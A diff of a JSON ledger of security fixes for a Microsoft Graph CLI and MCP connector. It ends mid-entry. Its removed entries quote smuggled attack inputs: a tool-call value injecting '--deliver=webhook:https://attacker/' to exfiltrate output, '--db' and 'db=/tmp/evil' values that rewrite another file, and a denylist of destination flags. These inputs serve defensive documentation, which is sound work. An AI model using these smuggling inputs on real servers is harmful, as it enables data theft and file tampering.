@@ -11,7 +11,7 @@
    "asserts": [
     {
      "file": "cli/internal/cli/root.go",
-     "contains": "rootCmd.AddCommand(newNovelAppsCmd(flags))",
+     "contains": "addNovelCommandIfAbsent(rootCmd, newNovelAppsCmd(flags))",
      "min_count": 1
     },
     {
@@ -28,6 +28,16 @@
      "file": "cli/internal/insights/consent.go",
      "contains": "func ConsentAudit(",
      "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/apps.go",
+     "contains": "Short:       \"Enterprise applications (service principals) and their consent grants\",",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/apps_consent.go",
+     "contains": "// pp:data-source live",
+     "code_only": false
     }
    ]
   },
@@ -42,7 +52,7 @@
      "contains": "func doctorProbeCredentials("
     },
     {
-     "file": "cli/internal/cli/doctor_verdict.go",
+     "file": "cli/internal/cli/doctor.go",
      "contains": "func doctorBaseURLIsPlaceholder("
     },
     {
@@ -64,6 +74,36 @@
     {
      "file": "cli/internal/cli/doctor.go",
      "not_contains": "for _, v := range report {"
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorUnexpectedStatus(authAPIErr.StatusCode, verifyPath, report)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"credentials\"] = \"ERROR not verified: no credential is configured, so nothing was probed.\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"api\"] = \"not configured (base_url is a placeholder); set \" + doctorBaseURLEnv + \" to your own instance URL\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorBaseURLIsShippedPlaceholder(cfg.BaseURL)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "func doctorBaseURLIsShippedPlaceholder(base string) bool {",
+     "min_count": 1,
+     "code_only": true
     }
    ]
   },
@@ -107,55 +147,6 @@
    ]
   },
   {
-   "id": "mcp-filesystem-destination-gate",
-   "summary": "The MCP shell-out layer refuses filesystem-destination flags (--db, --input, --output, --out, --home, --audit-dir, --receipt-file and friends) and any argument name carrying '=', so a tool call cannot point the local SQLite store, or any other file this account can reach, at a path of its choosing",
-   "why": "The MCP server runs the companion CLI as the server account and forwarded every command-local flag straight through as a CLI argument. `sync` and the other local-store commands expose --db, and the store's migration runs `DROP TABLE IF EXISTS resources_fts` plus a resources-table rebuild against whatever file it is handed, so one tool call shaped {\"db\": \"/path/to/someone-elses.sqlite\"} rewrote an unrelated database - no credentials required, because sync opens the store before it ever reaches the API. Proven end to end: against the pre-fix binary a single MCP tools/call on `sync` changed the victim file's sha and left resources_fts with 0 rows; against the patched binary the same call returns the same sync summary and the victim file is byte-identical. The gate has three parts, all in cli/internal/mcp/cobratree/shellout.go: blockedDestinationFlags (the runtime name floor, unioned into cliArgsFromMCP alongside the pre-existing blockedRootFlags behaviour, which is unchanged); an argument-name '=' guard, because \"db=/tmp/evil\" was emitted as --db=/tmp/evil and a name-only denylist never saw it; and isFilesystemPathFlag, which classifies a flag by its USAGE TEXT rather than its NAME. The usage-text test is load bearing and must not be turned into a name rule: the generated command surface carries API body fields called --path, --seed-path, --source-paths, --exclude-paths, --filename and --working-dir whose values go to the vendor API and never touch this account's disk, so a name rule would break real API surfaces while still missing the next generated flag that does take a local path. UnblockedFilesystemPathFlags applies that rule to the live Cobra tree over exactly the command set RegisterAll turns into shell-out tools (endpoint and framework commands are out of scope, which is what keeps the rule off generated vendor body fields), and TestNoShellOutToolCanDirectAFilesystemPath fails the build when a regeneration grows a local-path flag the floor does not name. vendorAPIPathFlags is the documented exception list for flags whose usage trips the rule but which name a location in the vendor's world. Both directions are pinned by the tests: the --db argument must be dropped AND an ordinary flag must still be forwarded, because a gate that swallows the real MCP surface is as harmful as one that misses the defect.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: the gate belongs in the generator. Two known residuals a reprint should close rather than re-inherit. (1) On the pre-4.30 cobratree the blocked flags are dropped at forward time but still appear in the tool's input schema, because toolOptionsForFlags in typemap.go advertises every flag; the caller gets silence instead of an error. The 4.30 shape (blockedStructuredArgsForCommand + allowedStructuredArgsForCommand) removes them from the schema and errors on them, which is the better behaviour. (2) isFilesystemPathFlag is only consulted by the package test here, not at request time, because the pre-4.30 shellOutToCLI receives no *cobra.Command; wiring it into the per-command blocked set (as skills/servosity does) makes a newly generated path flag refused at runtime rather than at CI time.",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "var blockedDestinationFlags = map[string]bool{",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "blockedDestinationFlags[k]",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "strings.Contains(k, \"=\")",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func isFilesystemPathFlag(flag *pflag.Flag) bool {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func UnblockedFilesystemPathFlags(root *cobra.Command) []string {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
-     "contains": "func TestMCPCannotDirectTheLocalStore(",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
-     "contains": "func TestMCPCannotSmuggleAFlagThroughAnEqualsSign(",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_tree_test.go",
-     "contains": "func TestNoShellOutToolCanDirectAFilesystemPath(",
-     "min_count": 1
-    }
-   ]
-  },
-  {
    "id": "novel-fixtures-recent-relative-to-today",
    "summary": "The novel-command seed store dates its security alert and its managed-device last-sync at now-1h instead of the literal 2099-01-01, so 'recent' keeps meaning recent, and the drift test now pins the absence of a stale reason",
    "why": "This is the same class of TEST defect that PR #300 fixed in quickbooks, found by that PR's fleet-wide sweep of every YYYY-MM-DD literal under skills/*/cli/internal/**/*_test.go and reported-but-not-fixed there. The command under test reads the wall clock; the fixture pinned an absolute date. That pairing is only true until the calendar reaches the literal, at which point the assertion inverts and the test fails on the date rather than on a code change. Concretely: security triage computes since = time.Now().UTC() - window and drops alerts created before it (insights.SecurityTriage), and managed-devices drift computes staleBefore = time.Now().UTC() - days and appends a 'stale' reason to anything older (insights.DeviceDrift). Both fixtures used 2099-01-01 as a stand-in for 'recent', which only works while the calendar is short of it. Post-2099 the alert falls outside the 24h look-back and TestSecurityTriageCommand loses its only alert, and the device picks up a 'stale' reason it was never meant to have. The fix seeds both from a single clock read at now-1h: an hour is comfortably inside a 24h look-back and comfortably inside a 1-day freshness window, on any run date and in any time zone, since both the fixture and the command's cutoff are computed in UTC from the same clock. The device assertion was also made stronger rather than looser - it now asserts the device is NOT flagged stale, which keeps the seeded sync time load-bearing instead of decorative. Proven both directions by driving insights.SecurityTriage and insights.DeviceDrift directly: with a 48h-old createdDateTime (the post-2099 equivalent) totalOpen is 0 and the old assertion FAILS, and the drift reasons come back [noncompliant stale unencrypted] so the new no-stale assertion FAILS; with the now-1h fixtures totalOpen is 1 and the reasons are [noncompliant unencrypted], both PASSING.",
@@ -185,304 +176,900 @@
    ]
   },
   {
-   "id": "mcp-argv-value-joined",
-   "summary": "cliArgsFromMCP emitted every tool-call value as its OWN argv element after its flag (--json <value>). Every value-carrying branch (string, float64, []any, default) now joins the value to the flag as one element (--json=<value>); bool true stays a bare --flag and the empty-string skip is unchanged.",
-   "why": "blockedRootFlags and blockedDestinationFlags filter KEYS only. A Cobra bool flag has NoOptDefVal and does not consume the token after it, so a tool-call VALUE that begins with '--' was parsed by pflag as its own flag: {\"json\": \"--deliver=webhook:https://attacker/\"} became argv `--json --deliver=webhook:...` and the denylisted --deliver took effect. Proven end to end on the real hudu-mcp binary (this same generated shellout.go) during the PR #317 review: a local webhook received 4,797 bytes of `doctor --json` output. Reported privately per SECURITY.md on 2026-09-09 as affecting the whole fleet (six connectors spot-checked by the reporter); this is the fleet backport of datagate commit 4075043e. Joined, pflag rejects the value outright on a bool flag (strconv.ParseBool) and contains it as the literal value on a string flag, so no value can ever reach a second flag. Fixed upstream in cli-printing-press main at be378adf (#4647, closes #4643, 2026-09-09) with the identical four lines, but NOT yet in a tagged press release (latest 4.32.1), so a reprint from any press at or below 4.32.1 REINTRODUCES the defect while go build and go test stay green; this entry is what notices. Retire it only after a reprint from a press release that carries #4647. code_only because the explanatory comment above the loop describes the joined form - the assert must be satisfied by the emission lines themselves. shellout_test.go (TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag) proves both directions: the split argv sets --deliver, the joined argv cannot.",
+   "id": "api-origin-pinned",
+   "class": "auth-wire",
+   "summary": "Every API request and redirect hop goes only to the scheme, host and port of MICROSOFT_GRAPH_BASE_URL (or the config file); anything else is refused before it is resolved, dialled or given the bearer token.",
+   "why": "Work order host pinning. originPinTripper and the same check FIRST in CheckRedirect (hand file internal/cli/msgraph_guard.go, registered with registerClientHook, so every CLI, novel fan-out and MCP client gets it). Byte-exact ASCII-folded origins; a host with a non-ASCII byte never matches. Under the pin, every request leaves through the credential kit's outbound guard (client.OutboundGuard, credkit-wiring), which refuses a held value off its allowed origin and over plain http. Tests: TestOriginPinRefusesRedirectToAnotherHost, TestGuardWrapsTheTransport, TestNormalizedOriginRefusesNonASCIIAndFillsPorts, TestRedirectNeverReachesAnotherHost (black-box, CLI and MCP). Ported to microsoft-graph from the vsphere 4.34.2 reprint (one credential layer across the fleet).",
    "status": "active",
    "asserts": [
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+tv)",
-     "min_count": 1,
+     "file": "cli/internal/cli/msgraph_guard.go",
+     "contains": "c.HTTPClient.Transport = originPinTripper{origins: origins, next: next}",
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+strconv.FormatFloat(tv, 'f', -1, 64))",
-     "min_count": 1,
+     "file": "cli/internal/cli/msgraph_guard.go",
+     "contains": "next = client.OutboundGuard(next)",
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+strings.Join(parts, \",\"))",
-     "min_count": 1,
+     "file": "cli/internal/cli/msgraph_guard.go",
+     "contains": "if err := checkPinned(origins, req.URL); err != nil {",
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+fmt.Sprintf(\"%v\", v))",
-     "min_count": 1,
+     "file": "cli/internal/cli/msgraph_guard.go",
+     "contains": "registerClientHook(func(c *client.Client) error {",
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "not_contains": "\"--\"+k, "
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout_test.go",
-     "contains": "func TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag(",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout_test.go",
-     "contains": "\"--filter=map[a:1]\"",
-     "min_count": 1,
+     "file": "cli/internal/cli/msgraph_cred_rules_test.go",
+     "contains": "func TestGuardWrapsTheTransport(t *testing.T) {",
      "code_only": true
     }
    ]
   },
   {
-   "id": "interim-http-security-note-2026-10-22",
-   "summary": "mcp-install.md and README.md open with the interim HTTP-mode security note and pauses the remote-agent recipe (launch line commented out, no tunnel step) until this connector is reprinted; the README and page.json ChatGPT answers say this build's remote path is paused.",
-   "why": "Docs-only interim fix ratified 2026-10-22. This build's HTTP mode is unsafe (no password and/or no rebinding guard, no request limits, writes with no confirmation), so the install guide must not tell anyone to run it or tunnel it. mcp-install.md is regenerated by msp-skills-publish onboard.py; this entry makes a regeneration that drops the note fail CI. Remove it on purpose with the post-reprint docs fix. 2026-10-22 follow-up to #428: README.md (security note under \"Works with your agent\", the ChatGPT / Copilot Studio / Gemini rows, the ChatGPT paragraph and FAQ) and page.json (ChatGPT FAQ, and from there docs/skills and llms-full.txt) carry the same pause. README.md is regenerated by onboard.py render_readme; page.json's FAQ is agent-authored prose, so a re-polish that restores the HTTPS/tunnel answer fails here.",
-   "status": "active",
-   "asserts": [
-    {
-     "file": "mcp-install.md",
-     "contains": "**Security note (until this connector is reprinted).**",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "contains": "# Remote agents (paused until this connector is reprinted)",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "not_contains": "via a secure tunnel"
-    },
-    {
-     "file": "README.md",
-     "contains": "**Security note (until this connector is reprinted).**",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "contains": "this connector's HTTP mode is paused until it is reprinted",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "not_contains": "--addr :7777"
-    },
-    {
-     "file": "page.json",
-     "contains": "this connector's HTTP mode is paused until it is reprinted",
-     "min_count": 1
-    },
-    {
-     "file": "page.json",
-     "not_contains": "--addr :7777"
-    }
-   ]
-  },
-  {
-   "id": "mcp-file-flags-refused",
-   "class": "mcp-file-flag",
-   "summary": "An MCP tool call can no longer name a file or directory on the MCP host: the cobratree mirror (press 4.24 and earlier) computes one blocked set per command (destination flags and mcp:write-flags always, root control-plane flags unless the command redefines them locally), leaves those flags out of the tool schema, and refuses both them and any argument the command does not declare with an error naming it; before, the schema advertised them, the shell-out layer forwarded any key it was handed, and blocked ones were dropped silently, so a call ran without the input it asked for and an undeclared key reached a subcommand through the args field (superops raw --vars @path)",
-   "why": "The MCP server runs the companion CLI as the account that hosts it; the operator at the command line is trusted, an MCP caller is not. tools/maintainer/check_mcp_file_flags.py derives, from data flow in this connector's code, every flag whose value can start a filesystem path (open, read, write, stat, mkdir, walk, exec, @path expansion), then drives the real MCP server and asserts each such flag is absent from every mirrored tool's schema and refused by name when supplied, and that an ordinary flag still reaches the CLI. On origin/main this connector failed it. Edits: the cobratree mirror (press 4.24 and earlier) computes one blocked set per command (destination flags and mcp:write-flags always, root control-plane flags unless the command redefines them locally), leaves those flags out of the tool schema, and refuses both them and any argument the command does not declare with an error naming it; before, the schema advertised them, the shell-out layer forwarded any key it was handed, and blocked ones were dropped silently, so a call ran without the input it asked for and an undeclared key reached a subcommand through the args field (superops raw --vars @path). The CLI keeps every flag. A reprint that drops these edits fails that check in CI and these asserts here.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: derive the MCP-refused flag set from data flow (a flag whose value can start a filesystem path) instead of usage text or a name list, drop refused flags from every tool schema, refuse them by name at call time, and refuse binary multipart fields in the in-process endpoint handler. Drafted as an upstream issue for cli-printing-press (import --input exposure); tools/maintainer/check_mcp_file_flags.py is the fleet gate until a reprint carries it.",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/walker.go",
-     "contains": "blocked := blockedFlagsForCommand(cmd)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/walker.go",
-     "contains": "shellOutToCLI(cliPath, path, blocked, declaredMCPFlagNames(cmd), inlineOnlyFlagsForCommand(cmd), commandTakesArgs(cmd))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/typemap.go",
-     "contains": "func toolOptionsForFlags(cmd *cobra.Command, blocked map[string]bool) []mcplib.ToolOption {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/typemap.go",
-     "contains": "if blocked[flag.Name] {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "if msg := refuseMCPArgs(args, declared, blocked, inlineOnly, takesArgs); msg != \"\" {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func refuseMCPArgs(args map[string]any, declared, blocked, inlineOnly map[string]bool, takesArgs bool) string {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func blockedFlagsForCommand(cmd *cobra.Command) map[string]bool {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "if name != mcpPositionalArgsField && !local[name] {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func flagWriteSinkNames(cmd *cobra.Command) map[string]bool {",
-     "min_count": 1,
-     "code_only": true
-    }
-   ]
-  },
-  {
-   "id": "secret-echo-decoded-funnel",
+   "id": "no-response-cache",
    "class": "secret-echo",
-   "summary": "One decoded output funnel for every server text the client shows: maskCredentialText (every API error, transport error, displayed URL and --dry-run parameter goes through it) still masks each held credential as written and URL-escaped, then withholds the WHOLE text if any held value survives in any view reachable by undoing control/format characters, JSON and JavaScript escapes, percent escapes at any depth, HTML entities, markup tags, and base64/base64url/hex runs at every alignment (cliutil.FunnelWithhold, shared byte-identical across the fleet). The held set is every value the masks cover plus the part after a scheme word and both halves of a base64 id:secret pair (Basic auth, composed keys). Surfaces funnelled here: the API error body (checked whole before the 4096-byte display cut, then again as shown). Round 3 (owner-approved structural pass): the decoder searches every view breadth-first over one fixed set of steps (control-character drop, JSON and JavaScript escapes, the identity escape as its own step, percent, HTML entities, tag strip, base64 at four alignments, hex at two), matches every view, the original included, before any filter, keeps every view a step makes (a literal backslash survives), deduplicates, and is capped by total work (512 times the input plus 4 MiB; text over 1 MiB or past the cap is withheld). Every value a funnel call is given is held process-wide (cliutil.FunnelHold), and the client holds its credentials when built and its resolved auth header on every request. Two error-only backstops withhold any held value: every command error before Cobra prints it plus every JSON/agent error envelope (internal/cli/secret_funnel_cli.go), and every MCP error result and handler error through the outermost tool middleware (cmd/<mcp>/secret_funnel_mcp.go). Success output is never funnelled. The `auth login` token function (mintClientCredentialsToken) funnels the complete raw body once, before it formats error_description, error or the body.",
-   "why": "class_harness.py secret-echo (Step 3.1, PR #436) drives the built CLI and MCP server against a fake server that reflects each configured credential in every encoding; on origin/main this connector printed the credential HTML-entity-encoded, JSON-escaped, double URL-encoded or base64 (the generated masks cover only the raw, QueryEscape and PathEscape forms; press issue #5145). Matching encoded needles one at a time never converged (saas-alerts and cisco-meraki review loops), so the fix is a decode-then-check backstop that withholds the whole text and fails closed (text over 4 MiB, a decoding chain that does not settle in 32 rounds, or work past the budget is withheld). Classification is kept: the plain withheld notice avoids every word the auth-error classifiers match, and a withheld text that itself read as an auth failure gets a notice that says so (an HTTP 400 'invalid token' answer echoing the token keeps its auth exit code). Codex round 1 (2026-10-23) added that, the fail-closed depth bound (a text-like layer left at depth 8 withholds), the JavaScript escapes \\v, \\0 and the identity escape, a bounded \\u{ search, and the token-endpoint error bodies outside the client. Known limits: values under 8 characters are only masked as written; case-changed, split-and-interleaved or otherwise transformed (compressed, encrypted) echoes are not reconstructed. A reprint that drops these edits fails class_harness.py secret-echo in CI and these asserts.",
+   "summary": "The on-disk response cache is off on every client: raw Microsoft Graph bodies never sit in cache files.",
+   "why": "Work order: nothing but the credential store holds a credential. c.NoCache = true in guardClient (msgraph_guard.go); TestGuardWrapsTheTransport asserts it. README and SKILL say responses are never cached (tools/apply_docfixes.py). Ported to microsoft-graph from the vsphere 4.34.2 reprint (one credential layer across the fleet).",
    "status": "active",
-   "spec_encode_followup": "Press-side: cli-printing-press issue #5145 (encoded credential echo). The generated maskCredentialText should end in a decode-then-check backstop over every held credential, and the error-body and token-endpoint paths should check the whole body before the display cut.",
    "asserts": [
     {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "func FunnelEchoes(text string, secrets []string) bool {",
-     "min_count": 1,
+     "file": "cli/internal/cli/msgraph_guard.go",
+     "contains": "c.NoCache = true",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-mirror-write-confirm",
+   "class": "write-safety",
+   "summary": "No MCP tool changes Microsoft Graph state: every endpoint tool is a GET marked read-only and every mirrored command is read-only or writes only the CLI's own files. The confirm gate stays installed so a mirrored command a later print adds that is neither read-only nor local previews and sends only with confirm: true.",
+   "why": "Work order: an MCP write previews and sends only with confirm: true. RequireConfirmForMirroredWrites (hand file internal/mcp/cobratree/msgraph_confirm.go), called from RegisterTools after RegisterAll. TestRegisteredMirroredWritesNeedConfirm fails on any registered tool that is not read-only, not on its local list and has no confirm gate; TestMCPSendsOnlyReads (black-box) checks a full MCP battery sends only GETs and the two logins. Ported to microsoft-graph from the vsphere 4.34.2 reprint (one credential layer across the fleet).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "cobratree.RequireConfirmForMirroredWrites(s, cli.RootCmd(), cobratree.CachedSiblingCLIPath)",
      "code_only": true
     },
     {
-     "file": "cli/internal/cliutil/secret_funnel_test.go",
-     "contains": "func TestFunnelRecognizesEveryEncodingOfAHeldSecret(t *testing.T) {",
-     "min_count": 1,
+     "file": "cli/internal/mcp/cobratree/msgraph_confirm.go",
+     "contains": "func RequireConfirmForMirroredWrites(",
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "held = append(held, value)",
-     "min_count": 1,
+     "file": "cli/internal/mcp/msgraph_confirm_registered_test.go",
+     "contains": "func TestRegisteredMirroredWritesNeedConfirm(t *testing.T) {",
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "return cliutil.FunnelWithhold(masked, held)",
-     "min_count": 1,
+     "file": "cli/internal/msgraphblackbox/blackbox_test.go",
+     "contains": "func TestMCPSendsOnlyReads(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "pull-follows-nextlink",
+   "class": "pagination",
+   "summary": "Hand `pull` command (registered by one line in generated root.go) syncs every collection by following @odata.nextLink through the configured host, including Teams phone numbers and Teams user configurations.",
+   "why": "4.34.2's generated sync pages with $skip and Graph's teams-users collection has no $skip, so a generated sync stopped at one page and reported it complete (fixed for sync by sync-reads-every-page). The hand pull follows @odata.nextLink, keeping only its path and query so the token goes to the configured host. A reprint regenerates root.go and drops the registration.",
+   "status": "active",
+   "spec_encode_followup": "x-pagination nextLink support in the press would retire the hand pull",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "rootCmd.AddCommand(newPullCmd(flags))",
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "func (c *Client) shownErrorBody(body []byte, extraCredentials ...string) string {",
-     "min_count": 1,
+     "file": "cli/internal/cli/pull.go",
+     "contains": "func graphGetAllPages(",
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "Body:       c.shownErrorBody(respBody, authHeader),",
-     "min_count": 1,
+     "file": "cli/internal/cli/pull.go",
+     "contains": "graphRelPath(u.Path)",
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "c.maskCredentialText(truncateBody(respBody), authHeader)"
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "cliutil.SanitizeErrorBody(string(body))"
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "cliutil.SanitizeErrorBody(truncateBody(body))"
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "var funnelSteps = []func(string) []string{",
-     "min_count": 1,
+     "file": "cli/internal/cli/pull.go",
+     "contains": "path: \"/admin/teams/telephoneNumberManagement/numberAssignments\"",
      "code_only": true
     },
     {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "funnelTextStep(funnelIdentityUnescape),",
-     "min_count": 1,
+     "file": "cli/internal/cli/pull.go",
+     "contains": "path: \"/admin/teams/userConfigurations\"",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "auth-login-pinned-and-held",
+   "class": "auth-wire",
+   "summary": "`auth login` (registered by one line in generated auth.go) posts the client id and secret only to the Entra token endpoint through the credential kit's transport, refuses any redirect, and holds the minted token with credkit.Hold before anything prints.",
+   "why": "The client-credentials mint is connector code outside the client's origin pin; without its own redirect refusal a Location header could carry the form (with the secret) to another host. The kit holds --client-secret and --client-id (CredentialFlags) and lets them reach only https://login.microsoftonline.com (Declarations.Origins); TestAuthLoginSendsThroughTheKit fails when the mint's client has no kit transport. A reprint regenerates auth.go and drops the registration.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "cmd.AddCommand(newAuthLoginCmd(flags))",
      "code_only": true
     },
     {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "func FunnelHeld(text string) string {",
-     "min_count": 1,
+     "file": "cli/internal/cli/auth_login.go",
+     "contains": "return errTokenRedirectRefused",
      "code_only": true
     },
     {
-     "file": "cli/internal/cliutil/secret_funnel_test.go",
-     "contains": "func TestFunnelCodexRound2(t *testing.T) {",
-     "min_count": 1,
+     "file": "cli/internal/cli/auth_login.go",
+     "contains": "Transport: credkit.Transport(nil),",
      "code_only": true
     },
     {
-     "file": "cli/internal/cli/secret_funnel_cli.go",
-     "contains": "func funnelCommandErrors(root *cobra.Command) {",
-     "min_count": 1,
+     "file": "cli/internal/cli/auth_login.go",
+     "contains": "credkit.Hold(\"minted:entra\", parsed.AccessToken)",
      "code_only": true
     },
     {
-     "file": "cli/internal/cli/secret_funnel_cli_test.go",
-     "contains": "func TestFunnelCommandErrorsWithholdsAnEchoedCredential(t *testing.T) {",
-     "min_count": 1,
+     "file": "cli/internal/cli/msgraph_cred_rules_test.go",
+     "contains": "func TestAuthLoginMintIsPinnedAndHeld(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/msgraph_cred_rules_test.go",
+     "contains": "func TestAuthLoginSendsThroughTheKit(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "graph-clientid-is-public",
+   "class": "secret-echo",
+   "summary": "A response field named clientId is not held as a credential: on an oauth2PermissionGrant it is the client service principal's object id that `apps consent` prints. config:client_id is a declared identifier; the --client-id flag value is still held and may reach only Entra.",
+   "why": "The fleet credential pattern holds clientId (a public half of a key pair elsewhere). In Graph it is an object id, so holding it withheld the consent audit's own rows. Under the credential kit, clientId is left out of Declarations.ResponseFields and config:client_id is an Identifier; TestClientIDIsPublicAndTheSecretIsNot keeps both. Decided in this reprint; see LEDGER-NOTES.md.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "{Source: \"config:client_id\", Reason:",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "not_contains": "\"clientId\""
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "CredentialFlags: []string{\"--client-secret\", \"--client-id\"},",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations_test.go",
+     "contains": "func TestClientIDIsPublicAndTheSecretIsNot(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "teams-phone-reads-in-spec",
+   "class": "docs",
+   "summary": "spec.yaml carries the Teams Phone READ resources (phone-numbers: numberAssignments list/get; teams-users: userConfigurations list/get) and a runnable example on every path parameter.",
+   "why": "Scope addition 1 (Teams phone-number and voice-policy reads, Graph v1.0). The library spec has neither; a reprint from the library spec drops both commands and the examples that feed Example strings and pp:happy-args. Source: tools/spec_repair.py in the reprint run. msp-skills withholds spec.yaml (press/publication.json: spec source not public), so here the asserts read the generated commands the spec produces; the library ledger keeps the spec.yaml asserts.",
+   "status": "active",
+   "spec_encode_followup": "carry these into the library spec at publish",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/phone-numbers_list.go",
+     "contains": "/admin/teams/telephoneNumberManagement/numberAssignments",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/phone-numbers_get.go",
+     "contains": "/admin/teams/telephoneNumberManagement/numberAssignments",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/teams-users_list.go",
+     "contains": "/admin/teams/userConfigurations",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/teams-users_get.go",
+     "contains": "/admin/teams/userConfigurations",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/teams-users_get.go",
+     "contains": "5c802b19-3600-83f1-1767-7b9edc7f38ab"
+    }
+   ]
+  },
+  {
+   "id": "transcripts-own-tenant",
+   "class": "write-safety",
+   "summary": "Teams meeting transcripts (list, download WebVTT, all) are own-tenant only: MICROSOFT_GRAPH_HOME_TENANT must equal the token's tid, a GDAP or guest user (idp != iss) is refused, app-only needs MICROSOFT_GRAPH_TRANSCRIPTS_APP_ONLY=1, an unreadable token is refused; nothing is kept on disk (no store, response cache or learn journal); MCP never writes a file and MICROSOFT_GRAPH_MCP_NO_TRANSCRIPTS=1 removes the tools.",
+   "why": "Scope addition 2: an MSP must not read its clients' meetings. The journal skip is one line in generated root.go (isLocalDataInvocation); a reprint regenerates it and transcripts runs would be journaled again. The novel files are hand-implemented over press scaffolds. Adversarial review 2026-10-28 (P2s, fixed): claims are read by their exact names (a struct decode matched \"TID\" case-insensitively, last key winning), and download --no-speakers labels its content with the format Graph sent.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "(chain[0] == \"local-data\" || chain[0] == \"transcripts\")",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcripts_gate.go",
